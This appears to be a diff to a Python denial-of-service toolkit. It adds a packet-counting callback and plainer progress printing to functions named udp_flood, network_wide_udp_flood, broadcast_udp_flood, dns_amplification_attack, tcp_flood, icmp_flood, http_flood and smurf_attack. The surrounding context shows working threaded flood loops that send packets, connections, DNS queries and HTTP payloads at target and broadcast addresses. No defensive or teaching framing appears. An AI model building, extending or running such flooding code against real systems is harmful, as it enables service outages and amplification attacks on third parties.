@@ -5,6 +5,9 @@ import time
 import struct
 import ipaddress
 
+# This will be injected/referenced from main.py
+packet_tracker = None
+
 def udp_flood(target_ip, target_port, duration, threads_count):
     print(f"[*] Starting AGGRESSIVE UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads")
     
@@ -33,6 +36,7 @@ def udp_flood(target_ip, target_port, duration, threads_count):
                         try:
                             sock.sendto(packet, (target_ip, target_port))
                             local_count += 1
+                            if packet_tracker: packet_tracker(1)
                         except BlockingIOError:
                             pass
                         except:
@@ -66,7 +70,7 @@ def udp_flood(target_ip, target_port, duration, threads_count):
         
         pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
         
-        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps")
         
         last_packets = current_packets
         last_time = time.time()
@@ -108,6 +112,7 @@ def network_wide_udp_flood(target_network, target_port, duration, threads_count)
                 try:
                     sock.sendto(packet, (str(host), target_port))
                     local_count += 1
+                    if packet_tracker: packet_tracker(1)
                 except:
                     pass
         
@@ -127,7 +132,7 @@ def network_wide_udp_flood(target_network, target_port, duration, threads_count)
         time.sleep(1)
         elapsed = time.time() - start_time
         with packet_lock:
-            print(f"\r[*] {int(elapsed)}/{duration}s | Total packets across network: {total_packets[0]:,}", end='', flush=True)
+            print(f"[*] {int(elapsed)}/{duration}s | Total packets across network: {total_packets[0]:,}")
     
     print("\n[*] Stopping attack...")
     stop_event.set()
@@ -162,6 +167,7 @@ def broadcast_udp_flood(target_network, target_port, duration, threads_count):
                 try:
                     sock.sendto(packet, (broadcast_ip, target_port))
                     local_count += 1
+                    if packet_tracker: packet_tracker(1)
                 except:
                     pass
         
@@ -179,7 +185,7 @@ def broadcast_udp_flood(target_network, target_port, duration, threads_count):
     while time.time() < end_time and not stop_event.is_set():
         time.sleep(1)
         elapsed = time.time() - start_time
-        print(f"\r[*] {int(elapsed)}/{duration}s | Broadcast packets sent: {total_packets[0]:,}", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Broadcast packets sent: {total_packets[0]:,}")
     
     stop_event.set()
     for thread in threads:
@@ -212,6 +218,7 @@ def dns_amplification_attack(target_ip, duration, threads_count):
                 try:
                     sock.sendto(query, (dns, 53))
                     local_count += 1
+                    if packet_tracker: packet_tracker(1)
                 except:
                     pass
         
@@ -229,7 +236,7 @@ def dns_amplification_attack(target_ip, duration, threads_count):
     while time.time() < end_time and not stop_event.is_set():
         time.sleep(1)
         elapsed = time.time() - start_time
-        print(f"\r[*] {int(elapsed)}/{duration}s | DNS queries sent: {total_packets[0]:,}", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | DNS queries sent: {total_packets[0]:,}")
     
     stop_event.set()
     for thread in threads:
@@ -257,8 +264,10 @@ def tcp_flood(target_ip, target_port, duration, threads_count):
                     try:
                         s.connect((target_ip, target_port))
                         local_count += 1
+                        if packet_tracker: packet_tracker(1)
                     except BlockingIOError:
                         local_count += 1
+                        if packet_tracker: packet_tracker(1)
                     except:
                         pass
                 except:
@@ -288,7 +297,7 @@ def tcp_flood(target_ip, target_port, duration, threads_count):
         
         cps = (current_conns - last_conns) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
         
-        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_conns:,} conns | Current Rate: {cps:.0f} cps", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Total: {current_conns:,} conns | Current Rate: {cps:.0f} cps")
         
         last_conns = current_conns
         last_time = time.time()
@@ -327,6 +336,7 @@ def icmp_flood(target_ip, duration, threads_count):
                 try:
                     sock.sendto(packet, (target_ip, 0))
                     local_count += 1
+                    if packet_tracker: packet_tracker(1)
                 except:
                     pass
         
@@ -356,7 +366,7 @@ def icmp_flood(target_ip, duration, threads_count):
         
         pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
         
-        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps")
         
         last_packets = current_packets
         last_time = time.time()
@@ -397,6 +407,7 @@ def http_flood(target_ip, duration, threads_count):
                     for payload in payloads:
                         sock.send(payload.encode())
                         local_count += 1
+                        if packet_tracker: packet_tracker(1)
                     
                     sock.close()
                 except:
@@ -426,7 +437,7 @@ def http_flood(target_ip, duration, threads_count):
         
         rps = (current_requests - last_requests) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
         
-        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_requests:,} reqs | Current Rate: {rps:.0f} rps", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Total: {current_requests:,} reqs | Current Rate: {rps:.0f} rps")
         
         last_requests = current_requests
         last_time = time.time()
@@ -474,6 +485,7 @@ def smurf_attack(target_ip, duration, threads_count):
                     try:
                         sock.sendto(packet, (bc_ip, 0))
                         local_count += 1
+                        if packet_tracker: packet_tracker(1)
                     except:
                         pass
         
@@ -503,7 +515,7 @@ def smurf_attack(target_ip, duration, threads_count):
         
         pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
         
-        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
+        print(f"[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps")
         
         last_packets = current_packets
         last_time = time.time()
